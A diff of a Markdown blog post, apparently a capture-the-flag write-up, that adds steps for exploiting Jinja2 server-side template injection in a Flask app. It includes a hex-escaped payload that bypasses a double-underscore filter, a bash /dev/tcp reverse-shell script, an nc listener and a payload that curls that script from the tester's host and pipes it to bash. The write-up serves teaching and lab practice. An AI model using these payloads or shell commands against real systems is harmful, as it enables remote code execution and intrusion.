@@ -192,22 +192,13 @@ Here's the rendered html img element too:
 
 The most popular Python template rendering library is [Jinja2][Jinja] which comes built-in by default with Flask.
 
-For rendering dynamic content in Flask templates, Jinja uses double curly braces.
+If we look up Jinja2 SSTI we can find some great resources. The first one being [Jinja2 SSTI - HackTricks][Jinja2 SSTI - HackTricks].
 
-<div class="article-image">
-  <img src="/assets/img/iclean/jinjavariables.png">
-  <p>Jinja documentation</p>
-</div>
-
-If we look up Jinja2 SSTI we can find some great resources.
-
-[Jinja2 SSTI - HackTricks][Jinja2 SSTI - HackTricks] 
-
-So for now, let's try to pass an input to list the directory.
+So, for now, let's try to pass an input to list the directory. Given their documentation, we could pass code like the following:
 
 <div class="article-code">
 {% highlight python %}
-{% raw %}{{ request.application.__globals__.__getitem__.__builtins__.__getitem__.__import__.popen('ls').read() }}{% endraw %}
+{% raw %}{{ request.application.__globals__.__builtins__.__import__.popen('ls').read() }}{% endraw %}
 {% endhighlight %}
 </div>
 
@@ -239,7 +230,7 @@ Let's break down the code.
 
 It returns an internal server error. Why doesn't this input work? 
 
-<i><strong style="color:#df0000;">Spoiler:</strong> there's a function in the `app.py` file of this Flask application which sanitizes double underscores (we go over it in the post explotation section)</i>
+<i><strong style="color:#df0000;">Spoiler:</strong> there's a function in the `app.py` file of this Flask application which sanitizes double underscores (we go over it in the post-exploitation section)</i>
 
 <div class="article-code">
 {% highlight python %}
@@ -248,15 +239,68 @@ def rdu(value):
 {% endhighlight %}
 </div>
 
-Replacing the underscores gives us another caviat
+Luckily, [Jinja2 SSTI - HackTricks][Jinja2 SSTI - HackTricks] has a section with code to bypass certain filters.
 
+<div class="article-image">
+  <img src="/assets/img/iclean/jinjafilterbypassssti.png">
+</div>
 
+<div class="article-code">
+{% highlight sh %}
+{% raw %}{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}{% endraw %}
+{% endhighlight %}
+</div>
 
+Let's send this code through the input and see what gets rendered.
 
+<div class="article-image">
+  <img src="/assets/img/iclean/filterbypass.png">
+</div>
 
+We successfully list the directory of the machine.
 
+Let's now try to get a reverse shell.
 
+First, create a script with a reverse shell command.
 
+<div class="article-code">
+{% highlight sh %}
+jeanp@~$ cat script.sh 
+/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.147/7777 0>&1'
+{% endhighlight %}
+</div>
+
+Secondly, open a python http server in the same directory where we created our script.
+
+<div class="article-code">
+{% highlight sh %}
+jeanp@~$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+{% endhighlight %}
+</div>
+
+Thirdly, open a listener with ncat.
+
+<div class="article-code">
+{% highlight sh %}
+jeanp@~$ nc -lvp 7777
+listening on [any] 7777 ...
+{% endhighlight %}
+</div>
+
+Finally, change the code to read our script with curl and then pipe the output to bash.
+
+<div class="article-code">
+{% highlight sh %}
+{% raw %}{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl http://10.10.14.147:8000/script.sh | bash')|attr('read')()%}{%print(a)%}{%endwith%}{% endraw %}
+{% endhighlight %}
+</div>
+
+<div class="article-image">
+  <img src="/assets/img/iclean/reverseshell.png">
+</div>
+
+After sending the payload, we get the reverse shell.
 
 
 [PortSwigger]: https://portswigger.net/support/using-sql-injection-to-bypass-authentication
